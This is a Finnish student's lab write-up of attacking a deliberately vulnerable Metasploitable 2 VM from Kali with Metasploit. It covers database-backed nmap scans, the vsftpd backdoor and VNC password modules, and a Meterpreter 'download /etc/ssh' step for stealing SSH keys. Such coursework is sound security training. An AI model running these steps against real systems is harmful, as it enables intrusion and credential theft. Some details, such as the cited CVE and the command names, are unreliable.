# Harjoitus 3: EternalHomework

## x) Materiaalit:
### Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit
- Penetraatiotestauksen perusteet käyttäen Metasploittia.
- Koostuu seitsemästä osasta:
  1. Esivuorovaikutukset
  2. Tiedusteluvaihe
  3. Uhkamallinnus
  4. Haavoittuvuusanalyysi
  5. Hyödyntäminen
  6. Hyödyntämisen jälkeiset toimet
  7. Raportointi
- Metasploit Frameworkin perusteet sekä exploit-, post-exploit-, liitännäis- ja apumoduulien (auxiliary modules) käyttö Metasploitissa.

### nmap -sn
_-sn_ komento ohjeistaa Nmapia olemaan suorittamatta porttiskannausta kohteen tunnistamisen jälkeen, jolloin komento kertoo ainoastaan käytettävissä olevat isännät, jotka vastasivat tunnistuskyselyihin.

Tunnetaan usein myös _"ping"_-komentona.

## b) Tallenna porttiskannauksen tuloksia Metasploitin tietokantoihin.
Aloitin tehtävän avaamalla molemmat virtuaalikoneeni, Kalin, sekä Metasploitable 2:n. Seuraavaksi halusin, että Metasploitablella olisi käytössään tehtävässä haluttu tietokanta (tässä tapauksessa postgresql). Käytin tähän seuraavia komentoja Kali-koneellani:

```
systemctl status postgresql.service

sudo systemctl start postgresql.servic
```
<img width="642" height="191" alt="VirtualBox_Kali_07_09_2026_19_38_47_2" src="https://github.com/user-attachments/assets/1efcbbc5-c165-4936-868c-837214af2586" />

Saatuani postgresql-palvelun päälle, avasin yhteyden kali-laitteelta metasploitableen komennoilla:
```
sudo msfdb init

sudo msfconsole

sudo db_status
```

<img width="955" height="462" alt="VirtualBox_Kali_07_09_2026_20_05_26" src="https://github.com/user-attachments/assets/8d223acd-f77e-461e-9c32-2e8050054036" />

(HUOM! Muista oikeinkirjoitus, sillä kirjoitin itse aluksi useaan otteeseen msfdb komennon väärinpäin msfbd)

Loin tehtävää varten itselleni myös workspacen, käyttämällä komentoa ```workspace -a h3``` ja otin tämän käyttööni komennolla ```workspace h3```.

<img width="289" height="103" alt="VirtualBox_Kali_07_09_2026_19_48_47" src="https://github.com/user-attachments/assets/6193c1d5-ec61-493a-ae8a-f45817c26933" />

Päästyäni tähän asti aloitin metasploitablen skannauksen komennolla ```db_nmap -sV 192.168.56.104```. Osoite oli itselläni muistissa viime tehtävästä, mutta tämän saisi helposti tietoon käyttämällä kohdelaitteella ```ifconfig```-komentoa.

(Tässä tehtävän osiossa skannasin alkuun myös vahingossa myös Kali-koneen (192.168.56.103), joka näkyykin myös tallentuneena harjoituksen c-osiossa.)

<img width="935" height="578" alt="VirtualBox_Kali_07_09_2026_20_03_19" src="https://github.com/user-attachments/assets/b42dd711-f6ac-4e3b-bbe6-4da71a680956" />


Kannattaa skannata.

## c) Tarkastele Metasploitin tietokantoihin tallennettuja tietoja komennoilla "hosts" ja "services". 

Seuraavaksi käyttäen komentoja ```hosts``` ja ```services``` aloin tarkastelemaan tietokantaan tallentuneita kohdekoneita (saatu tietoon ```nmap```-komennoilla), sekä myös tallentuneita palveluita.

<img width="955" height="650" alt="VirtualBox_Kali_07_09_2026_20_10_36" src="https://github.com/user-attachments/assets/d61847b5-8570-4104-99e5-ba0f383652c8" />

Tämän jälkeen komennolla ```services -h``` pystymme tarkkailemaan mahdollisia tapoja rajata hakuja. ```-S``` parametri kuulostaakin parhaalta tähän touhuun! Rajataampas haku siis myöskin edellisessä tehtävässä tutuksi tulleeseen _java-rmi_-palveluun käyttäen komentoa ```services -S java-rmi```!

<img width="937" height="478" alt="VirtualBox_Kali_07_09_2026_20_18_18" src="https://github.com/user-attachments/assets/61e58f6b-36c7-43ef-bf71-e6cab23e7247" />

## d) Internet famous. 

Tutkikaamme hieman lisää tätä java-rmi exploittia!

National Vulnerability Database (NIST), kertoo Java RMI -palvelimen oletusasetuksien ovat turvattomuudesta, joka mahdollistaa Java-koodin suorittamisen URL-osoitteesta, sillä ohjelma käyttää RMI:n hajautetun roskienkeruun (Distributed Garbage Collector) metodia. Kyseinen haitta vaikutti palveluun vuosista 2001 jopa 2020 asti! Huh!

<img width="940" height="225" alt="VirtualBox_Kali_07_09_2026_20_30_32" src="https://github.com/user-attachments/assets/f667f799-c720-47c3-a5bf-71d2a79249f6" />

## e) Vertaile nmap:n omaa tiedostoon tallennusta (-oA foo) ja db_nmap:n tallennusta tietokantoihin. 

Mitkä ovat eri tiedostomuotojen ja Metasploitin tietokannan hyvät puolet?

### Metasploitable: 
Tallentaa nmap tulokset suoraan tietokantaan:
- Tietokannasta datan voi viedä ulos ja sisään helposti käyttäjän haluamalla tavalla.
- Pääsy tietokantaan sallii nopean ja luotettavan pääsyn skannauksien tuloksiin.

### Nmap:in oma tiedosto tallennus (-oA foo)
Skannauksien tulostus on mahdollista kolmeen eri muotoon:
- XML
- Grepable, helppo tiedostojen luku (grep-komento).
- Normal


## f) Murtaudu Metasploitablen vsftpd-palveluun.

Aika kaivaa sormikkaat esiin ja käydä hyökkäykseen! Aloitin etsimällä Metasploitablen valmiita hyökkäyspaketteja käyttämällä komentoa ```search vsftpd```. Tämän avulla pääsin valitsemaan itselleni käyttöön haluamani moduulin, joista valitsin moduulin 1 komennolla ```use 1```.

<img width="955" height="515" alt="VirtualBox_Kali_07_09_2026_20_51_42" src="https://github.com/user-attachments/assets/8aa8e762-4172-4d09-b6e6-458875d7fbec" />

Tämän jälkeen pääsinkin valitsemaan mitä kyseisellä hyökkäyksellä haluaisin tehdä. Tietääkseni lisää, käytin komentoa ```show options```, tietääkseni hieman lisää hallussani olevista komennoista!

<img width="955" height="785" alt="VirtualBox_Kali_07_09_2026_20_52_50" src="https://github.com/user-attachments/assets/bd4f57f9-6c65-4a9e-ba51-c925ccbd4632" />

Halusin seuraavaksi varmistaa hyökkääväni oikealle koneelle, joten asetin itseni komennon ajajaksi 

```set LHOST 192.168.56.103```

Sekä Metasploitablen kohteekseni komennolla 

```set RHOST 192.168.56.104```

Ja ei muutakun rankkaa hakkerointia antamalla komento 

```exploit```

<img width="942" height="226" alt="VirtualBox_Kali_07_09_2026_21_00_04" src="https://github.com/user-attachments/assets/f552806b-523e-47b8-878e-42b4f9cd625b" />

<img width="498" height="280" alt="hacker-hackerman" src="https://github.com/user-attachments/assets/85d9cb9c-6bc7-4ab8-b0f4-f9963fdda48d" />


## g) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. 

Normaalisti vastaavanlaisessa tilanteessa järkevin liike saattaisi olla tarkistaa onko kohteena oleva laite liitetty muualle tai onko tällä pääsyä muualle. Tämä onnistuu jälleen kerran käyttäen ```ipconfig``` komentoa.

<img width="796" height="400" alt="VirtualBox_Kali_07_09_2026_21_02_29" src="https://github.com/user-attachments/assets/d8ab56b4-8a5d-4e2c-a6f0-c2a0ea0620f6" />

Muuta kiinnostavaa tutkittavaa saattaa olla esimerkiksi ```sysinfo```-komennolla tietoon saatavat kohdelaitteen tiedot!

<img width="955" height="128" alt="VirtualBox_Kali_07_09_2026_21_10_52" src="https://github.com/user-attachments/assets/c9540602-6b64-420a-915c-10b7a4c7cf58" />


## h) Murtaudu Metasploitableen jollain toisella tavalla. 

Päätin tässä tehtävässä käyttää vnc exploittia, etsien mahdollisia tapoja murtautua Metasploitablelle komennolla ```search vnc```. Ja niitähän löytyikin noin 232 tapaa... Verkosta löytyy useampi eri läpikulku kyseiselle murtautumistavalle, joista kaikki tuntuvatkin toimivan samalla tavalla! Vilkaisin itse nopeasti Medium-sivustolta käyttäjän MichaelLearns läpikulkua vnc moduulista.

<img width="955" height="813" alt="VirtualBox_Kali_07_09_2026_21_50_31" src="https://github.com/user-attachments/assets/82aed58e-26c3-4d86-a9b7-a2ccfcf9b813" />

Päätin turvautua tavoista ensimmäiseen, vnc skanneriin, jonka pitäisi antaa minulle kohdelaitteella root-oikeudet! Komentohan tässä oli siis tuttu ```use 0```.

<img width="955" height="187" alt="VirtualBox_Kali_07_09_2026_21_50_48" src="https://github.com/user-attachments/assets/689bd7ae-ea3a-4d4b-8766-19f14a61cdaa" />

Asetin itselleni jälleen aloitus- ja kohdelaitteet komennoilla:

```
set LHOST 192.168.56.103

set RHOST 192.168.56.104
```

Ja pääsinkin aktivoimaan komennolla ```exploit```.

<img width="920" height="230" alt="VirtualBox_Kali_07_09_2026_21_58_39" src="https://github.com/user-attachments/assets/3b7895f7-eec4-43b0-b96b-3f1dbe8c406a" />

Moduuli yrittää kirjautua sisään käyttäen luettelossaan olevia salasanoja kohteen ​​portissa 5900.

<img width="625" height="250" alt="VirtualBox_Kali_07_09_2026_21_58_25" src="https://github.com/user-attachments/assets/24fedd97-0ccf-48f4-8e1e-2130ac936025" />

Useat muut vnc-moduulit ajavat läpi useita eri yleisiä salasanoja. Valitsemamme moduuli ei tätä tee, mutta muita moduuleja kokeilemalla saamme tietoomme, että kohdelaite käyttää salasanaa password, joten käyttäkäämme sitä!

<img width="540" height="384" alt="VirtualBox_Kali_07_09_2026_21_58_12" src="https://github.com/user-attachments/assets/2db9c8e1-6597-4b65-9613-360c7528663c" />

Ja sisällä ollaan!

## i) Demonstroi Meterpretrin ominaisuuksia.

Käyttäen Meterpreteriä on hyökkääjän mahdollista ryöstää ssh-avain itselleen mahdollista jatkoyhteyttä varten! Tämä onnistuisi helposti ja nopeasti lataamalla koko /etc/ssh hakemisto käyttämällä ```download /etc/ssh```-komentoa.

<img width="796" height="282" alt="VirtualBox_Kali_07_09_2026_21_02_29_ssh" src="https://github.com/user-attachments/assets/3a4f8d9e-ebc6-4c05-b488-2e51eae6a8d1" />

## j) Tallenna shell-sessio tekstitiedostoon script-työkalulla tai tmux:lla.

Loin aluksi itselleni _testitedosto.txt_-nimisen tiedoston, jonka jälkeen komennolla ```script -fa tekstitiedosto.txt``` pystyin tallentamaan shell-sessioni kyseiselle tiedostolle! Päätin avata yhteyden Metasploitableen, mennä aiemmin luomaani _h3_ workspaceen, ajaa ```services```-komennon ja palata takaisin tarkastamaan tiedoston.

<img width="955" height="764" alt="VirtualBox_Kali_07_09_2026_22_26_57" src="https://github.com/user-attachments/assets/39ca545a-c9d1-4dcb-b24e-34ca98aa0177" />

<img width="915" height="696" alt="VirtualBox_Kali_07_09_2026_22_32_27" src="https://github.com/user-attachments/assets/a1585f47-747c-453a-b4af-b3dad7f35482" />

Vaikka skripti ei syystä tai toisesta kerro loppuneensa/toimivansa, simppelillä ```nano tekstitiedosto.txt```-komennolla näen sen toimineen halutulla tavalla:

<img width="955" height="825" alt="VirtualBox_Kali_07_09_2026_22_32_45" src="https://github.com/user-attachments/assets/410566ba-c914-4323-860c-f69566a6123a" />

## k) Pivot point. 

Jostain syystä ajaessani ```grep -r``` komentoa, ei tiedostoni aukea halutulla tavalla? Tiedosto välähtää hetken ja näyttää vain seuraavaa:

<img width="955" height="185" alt="VirtualBox_Kali_07_09_2026_22_50_18" src="https://github.com/user-attachments/assets/bc46ed38-5d74-48b6-923f-f3dfe402ce3d" />

(Ajettu komento ```grep -r "vsftpd" harjoitus3/```)

Komento olisi erittäin hyödyllinen halutessa tutkia esimerkiksi tiedusteluhyökkäyksen jälkeen tallennettuja shell-session tietoja kohteesta, esimerkiksi mahdollisten haavoittuvuuksien tarkkailun perässä!

## l) Attaaack! 

Mitä Mitre Attack taktiikoita ja tekniikoita käytit tässä harjoituksessa?

### Reconnaissance 	
- Active Scanning
- Gather Victim Host Information
- Gather Victim Network Information 

### Resource Development 
- None

### Initial Access 
- Exploit Public-Facing Application

### Execution
- None

### Persistence
- None

###  Privilege Escalation 
- None

### Stealth
- None

### Defense Impairment 
- None

### Credential Access 
- Adversary-in-the-Middle
- Brute Force

### Discovery
- Network Service Discovery
- Software Discovery
- System Information Discovery
- System Network Configuration Discovery

### Lateral Movement
- Lateral Tool Transfer

### Collection
- Data from Local System

### Command and Control
- Non-Application Layer Protocol

### Exfiltration
- None

### Impact
- None

# Lähteet:
Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit. Luettavissa: https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml Luettu 7.9.20206

MichaelLearns, Medium 2025. Luettavissa: https://medium.com/@MichaelLearns_/metasploitable-2-walkthrough-vnc-viewer-exploitation-7bb0b4e93fc8 Luettu 7.9.2026

Mitre, ATT&CK. Luettavissa: https://attack.mitre.org/ Luettu 7.9.2026

NIST, https://nvd.nist.gov/vuln/detail/cve-2020-9761

nmap manual, Host Discovery. Luettavissa: https://nmap.org/book/man-host-discovery.html Luettu 7.9.2026
